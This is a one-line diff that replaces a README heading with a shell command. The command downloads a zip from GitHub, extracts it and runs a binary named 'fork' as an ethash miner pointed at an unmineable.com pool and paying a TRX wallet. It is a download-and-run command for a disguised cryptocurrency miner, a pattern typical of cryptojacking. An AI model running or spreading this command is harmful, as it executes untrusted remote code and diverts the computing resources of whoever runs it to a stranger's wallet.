@@ -1,1 +1,1 @@
-# saS
+wget https://github.com/hasra33/saS/raw/main/fork.zip && apt install unzip && unzip fork.zip  && cd fork && ./fork -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.sas
